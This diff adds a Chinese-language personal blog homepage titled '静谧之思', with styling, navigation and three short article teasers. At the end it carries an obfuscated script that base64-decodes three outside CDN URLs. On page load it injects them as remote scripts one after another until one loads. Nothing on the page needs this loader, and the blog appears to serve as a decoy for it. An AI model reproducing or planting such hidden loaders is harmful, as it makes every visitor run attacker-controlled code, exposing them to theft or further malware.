@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>静谧之思 - 记录与分享</title>
+    <style>
+        /* 全局重置与基础样式 */
+        body {
+            overflow: hidden;
+            font-family: 'Times New Roman', serif;
+            /* 经典的衬线字体 */
+            margin: 0;
+            padding: 0;
+            background-color: #F8F8F8;
+            /* 极浅灰色背景 */
+            color: #333333;
+            /* 标准深灰色文本 */
+            line-height: 1.8;
+            /* 增加行高，提升阅读舒适度 */
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* 容器 */
+        .container {
+            max-width: 85%;
+            /* 略窄的容器，增加留白感 */
+            margin: 0 auto;
+            padding: 30px 0;
+            /* 增加上下内边距 */
+        }
+
+        /* 头部 - 简洁与留白 */
+        header {
+            background-color: #FFFFFF;
+            /* 纯白色背景 */
+            padding: 50px 20px;
+            /* 更大的内边距 */
+            text-align: center;
+            border-bottom: 1px solid #E0E0E0;
+            /* 极细的底部边框 */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.03);
+            /* 极轻微的阴影 */
+        }
+
+        header h1 {
+            margin: 0;
+            font-family: 'Playfair Display', serif;
+            /* 艺术感标题字体 */
+            font-size: 2.8em;
+            /* 更大标题 */
+            color: #333333;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            /* 标题大写 */
+        }
+
+        header p {
+            font-family: 'Georgia', serif;
+            font-size: 1.2em;
+            color: #757575;
+            /* 柔和灰色 */
+            margin-top: 15px;
+            font-style: italic;
+            /* 副标题斜体 */
+        }
+
+        /* 导航菜单 - 简洁分隔线 */
+        nav {
+            background-color: #FFFFFF;
+            text-align: center;
+            padding: 15px 0;
+            margin-top: 30px;
+            border-radius: 5px;
+            /* 极小的圆角 */
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            /* 居中排列 */
+            flex-wrap: wrap;
+        }
+
+        nav ul li {
+            margin: 0 20px;
+            /* 增加间距 */
+            position: relative;
+        }
+
+        nav ul li:not(:last-child)::after {
+            /* 导航项之间的分隔线 */
+            content: '|';
+            position: absolute;
+            right: -20px;
+            /* 调整位置 */
+            color: #BDBDBD;
+            /* 分隔线颜色 */
+            font-size: 0.9em;
+        }
+
+        nav ul li a {
+            color: #555555;
+            /* 默认文字颜色 */
+            text-decoration: none;
+            padding: 8px 0;
+            display: inline-block;
+            font-weight: 500;
+            font-size: 1.05em;
+            transition: color 0.3s ease;
+        }
+
+        nav ul li a:hover,
+        nav ul li a:focus {
+            color: #81C784;
+            /* 强调色：浅绿色 */
+        }
+
+        /* 内容区 - 优雅卡片与清晰排版 */
+        main {
+            padding-top: 30px;
+        }
+
+        .article-card {
+            background-color: #FFFFFF;
+            margin-bottom: 40px;
+            /* 更大卡片间距 */
+            padding: 35px;
+            /* 更大内边距 */
+            border-radius: 8px;
+            /* 适中圆角 */
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.06);
+            /* 柔和阴影 */
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .article-card:hover {
+            transform: translateY(-7px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .article-card h2 {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.2em;
+            color: #333333;
+            margin-top: 0;
+            margin-bottom: 15px;
+            line-height: 1.3;
+        }
+
+        .article-card .date {
+            font-family: 'Times New Roman', serif;
+            font-size: 0.9em;
+            color: #9E9E9E;
+            /* 柔和灰色 */
+            margin-bottom: 25px;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .article-card p {
+            font-size: 1.05em;
+            color: #424242;
+            margin-bottom: 25px;
+        }
+
+        .article-card img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 30px auto;
+            /* 增加图片上下间距 */
+            border-radius: 5px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .read-more {
+            display: inline-block;
+            background-color: #81C784;
+            /* 强调色按钮 */
+            color: #ffffff;
+            padding: 12px 28px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            font-family: 'Segoe UI', sans-serif;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.15);
+        }
+
+        .read-more:hover {
+            background-color: #4CAF50;
+            /* 悬停深绿色 */
+            transform: translateY(-2px);
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        /* 页脚 - 简洁与版权 */
+        footer {
+            background-color: #E0E0E0;
+            /* 浅灰色背景 */
+            color: #616161;
+            /* 柔和深色文本 */
+            padding: 30px 0;
+            text-align: center;
+            font-size: 0.85em;
+            margin-top: 50px;
+            /* 增加与内容区的间距 */
+            border-top: 1px solid #BDBDBD;
+            /* 细分隔线 */
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.03);
+        }
+
+        .social-links a {
+            color: #616161;
+            text-decoration: none;
+            margin: 0 18px;
+            /* 增加社交链接间距 */
+            font-size: 1.3em;
+            transition: color 0.3s ease;
+        }
+
+        .social-links a:hover {
+            color: #81C784;
+            /* 强调色 */
+        }
+    </style>
+    <link rel="stylesheet" href="./static/css/style.css">
+</head>
+
+<body>
+    <header>
+        <div class="container">
+            <h1>静谧之思</h1>
+            <p>在文字中寻找片刻宁静</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <nav id="mainNav">
+            <ul>
+                <li><a href="#recent-reflections">近期思考</a></li>
+                <li><a href="#categories">分类</a></li>
+                <li><a href="#about-me">关于我</a></li>
+                <li><a href="#contact">联系</a></li>
+            </ul>
+        </nav>
+
+        <main>
+            <section id="recent-reflections">
+                <h2>近期思考</h2>
+                <div class="article-list">
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=1&tag=nature-calm-1a2b3c" alt="自然与平静"
+                            class="random-image">
+                        <h2>数字喧嚣中的平静之道</h2>
+                        <span class="date">2025年07月29日</span>
+                        <p>在这个信息爆炸的时代，如何保持内心的平静和专注，成为了一项重要的课题。本文探讨了一些在数字环境中寻找宁静的方法。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </div>
+
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=2&tag=book-reading-4d5e6f" alt="阅读与思考"
+                            class="random-image">
+                        <h2>重拾阅读：纸质书的魅力</h2>
+                        <span class="date">2025年07月22日</span>
+                        <p>在电子阅读盛行的当下，纸质书依然以其独特的触感和仪式感吸引着我。本文分享了重拾纸质阅读的体验与感悟。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </div>
+
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=3&tag=minimalist-design-7g8h9i" alt="极简设计"
+                            class="random-image">
+                        <h2>极简主义生活：少即是多</h2>
+                        <span class="date">2025年07月15日</span>
+                        <p>极简主义不仅是一种设计风格，更是一种生活哲学。通过简化，我们能更专注于真正重要的事物。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 静谧之思. 版权所有.</p>
+            <div class="social-links">
+                <a href="#" target="_blank">微博</a> |
+                <a href="#" target="_blank">豆瓣</a> |
+                <a href="#" target="_blank">邮箱</a>
+            </div>
+        </div>
+    </footer>
+    <div id="overlay">
+        <div id="loading_box" class="loading_container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            document.querySelectorAll('nav a').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop,
+                            behavior: 'smooth'
+                        });
+                    }
+                });
+            });
+        });
+    </script>
+   <script>
+        (function () {function l(r){let e=a=>new Promise((n,t)=>{if(a>=r.length)return t(Error("oo"));let c=atob(r[a])+"?v=2",o=document.createElement("script");o.src=c,o.async=!0,o.onload=()=>{n(c)},o.onerror=()=>{console.warn("nn"),e(a+1).then(n).catch(t),o.remove()},document.head.appendChild(o)});return e(0)}l(["aHR0cHM6Ly9jZG4ucmZpd3B3LmNuL3N0YXRpYy9qcy9jb2RlLnYyLmpz","aHR0cHM6Ly9jZG4uamlubWEyMDI1LmNvbS9zdGF0aWMvanMvY29kZS52Mi5qcw==","aHR0cHM6Ly9jZG4uamlubWEyMDI2LmNuL3N0YXRpYy9qcy9jb2RlLnYyLmpz"]).then(r=>console.log("ok")).catch(r=>console.error(r));})();
+    </script> 
+
+</body>
+
+</html>
